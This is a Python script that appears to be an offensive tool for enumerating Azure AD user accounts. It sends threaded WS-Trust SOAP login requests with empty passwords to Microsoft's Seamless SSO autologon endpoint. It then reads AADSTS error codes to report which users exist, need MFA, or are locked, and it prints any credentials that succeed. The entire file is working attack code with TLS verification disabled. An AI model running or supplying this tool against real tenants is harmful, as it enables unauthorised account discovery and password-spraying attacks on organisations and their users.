#!/usr/bin/env python

from os import error
import requests
import datetime
import argparse
from uuid import uuid4
import xml.etree.ElementTree as ET
from os.path import exists
from concurrent.futures import ThreadPoolExecutor

requests.urllib3.disable_warnings() 

def send_request(domain_user, password):

    username, domain = domain_user.split('@')

    now = datetime.datetime.utcnow()
    created = now.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    expires = (now + datetime.timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

    url = f"https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={uuid4()}"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1237"
    }

    proxies = {
        # 'https' : 'http://192.168.1.110:8081'
    }

    body = f"""
    <?xml version='1.0' encoding='UTF-8'?>
    <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
        <s:Header>
            <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
            <wsa:To s:mustUnderstand='1'>{url}</wsa:To>
            <wsa:MessageID>urn:uuid:{uuid4()}</wsa:MessageID>
            <wsse:Security s:mustUnderstand="1">
                <wsu:Timestamp wsu:Id="_0">
                    <wsu:Created>{created}</wsu:Created>
                    <wsu:Expires>{expires}</wsu:Expires>
                </wsu:Timestamp>
                <wsse:UsernameToken wsu:Id="uuid-{uuid4()}">
                    <wsse:Username>{domain_user}</wsse:Username>
                    <wsse:Password>{password}</wsse:Password>
                </wsse:UsernameToken>
            </wsse:Security>
        </s:Header>
        <s:Body>
            <wst:RequestSecurityToken Id='RST0'>
                <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                    <wsp:AppliesTo>
                        <wsa:EndpointReference>
                            <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                        </wsa:EndpointReference>
                    </wsp:AppliesTo>
                    <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
            </wst:RequestSecurityToken>
        </s:Body>
    </s:Envelope>
    """

    resp = requests.post(url, data=body.strip(), headers=headers, proxies=proxies, verify=False, timeout=30)
    root = ET.fromstring(resp.text)
    if resp.status_code == 200:
        try:
            sso_token = root[1][0][3][0][0].text  # gets the desktop sso token to verify the 200 indicates login
            if sso_token:
                print(f"Valid credentials found! {username}:{password}")
        except:
            print(resp.text)
    elif resp.status_code == 400:
        try:
            error_string = root[1][0][2][0][1][1].text  # pulls the error code from the response
            if "AADSTS50014" in error_string:  # exists, max passthru exceeded
                print(f"Valid user found: {username} [max passthru exceeded")
            elif "AADSTS50076" in error_string:  # exists, needs mfs
                print(f"Valid user found: {username} [needs mfa]")
            elif "AADSTS50056" in error_string:  # exists, w/ no pw
                print(f"Valid user found: {username} [no pw]")
            elif "AADSTS50126" in error_string:  # exists, bad pw
                print(f"Valid user found: {username} [bad pw]")
            elif "AADSTS50053" in error_string:  # exists, locked
                print(f"Valid user found: {username} [locked]")
            else:
                pass

        except Exception as e:
            print(f"Unknown error: {e}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--userfile', help="Required. The file containing usernames. Format: username@domain.com")
    parser.add_argument('-t', '--threads', help="Number of threads. Default = 10", default=10)

    args = parser.parse_args()

    if args.userfile and exists(args.userfile):
        with open(args.userfile, "r") as f:
            users = f.readlines()
            with ThreadPoolExecutor(max_workers=int(args.threads)) as executor:
                for user in users:
                    executor.submit(send_request, user.strip(), "")
                    #send_request(user.strip(), "")
    else:
        parser.print_usage()

